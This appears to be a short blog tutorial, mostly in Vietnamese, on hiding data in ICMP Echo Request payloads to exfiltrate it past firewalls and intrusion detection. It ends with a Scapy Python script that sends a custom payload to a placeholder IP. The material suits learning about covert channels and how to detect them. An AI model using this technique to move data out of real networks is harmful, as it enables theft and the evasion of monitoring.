---
title:  "ICMP Packets with Payload"
date: 2025-04-13 10:00:00 +0700
comments: true
description: How to Create ICMP Packets with Payload to Exfiltrate Data
categories: [Cybersecurity, Networking]
toc: true
tags: [protocol, python, packet, icmp]
image:
    path: /assets/img/posts/2025-04-13-how-to-create-icmp-packet-with-payload-exfiltrate-data/icmp.png
---

## Introduction
Trong một số tình huống, kẻ tấn công có thể lợi dụng giao thức ICMP để gửi dữ liệu ra ngoài mạng, vượt qua các tường lửa và hệ thống Phát hiện/Ngăn chặn xâm nhập (IDS/IPS). Điều này có thể được thực hiện bằng cách nhúng dữ liệu vào các gói ICMP Echo Request và Echo Reply, khiến việc phát hiện việc xâm nhập trở nên khó khăn hơn.

Các gói ICMP, thường được sử dụng cho các chẩn đoán mạng như "ping", có thể bị thao túng để mang theo các payload tùy chỉnh (dữ liệu) mà kẻ tấn công muốn gửi.

---
## ICMP Payload Theory

- **ICMP Echo Request (Loại 8) và Echo Reply (Loại 0)** là các loại gói ICMP phổ biến, thường được sử dụng cho các yêu cầu ping. Tuy nhiên, ngoài việc kiểm tra kết nối, chúng có thể chứa một payload — dữ liệu mà kẻ tấn công muốn gửi.
  
- **Payload** đề cập đến dữ liệu được bao gồm trong gói ICMP. Dữ liệu này có thể là văn bản thuần túy, thông tin đã mã hóa hoặc thậm chí là dữ liệu bị đánh cắp.

---
## Creating ICMP Packets with Payload

Bạn có thể tạo các gói ICMP với payload tùy chỉnh bằng cách sử dụng Python và thư viện `Scapy`. Dưới đây là ví dụ về cách tạo một gói ICMP Echo Request với payload tùy chỉnh.

```python
from scapy.all import IP, ICMP, send

def send_icmp_payload(target_ip, message):
    # The payload is the message you want to send, can be encoded data
    payload = bytes(message, 'utf-8')

    # Create an ICMP Echo Request packet
    packet = IP(dst=target_ip) / ICMP(type=8) / payload  # type=8 is Echo Request

    # Send the packet
    print(f"Sending ICMP Echo Request with payload to {target_ip}")
    send(packet)

## Target IP and the message to be sent
target_ip = "192.168.x.x"  # Replace with the actual target IP address
message = "This is a test payload that could contain exfiltrated data."

send_icmp_payload(target_ip, message)
```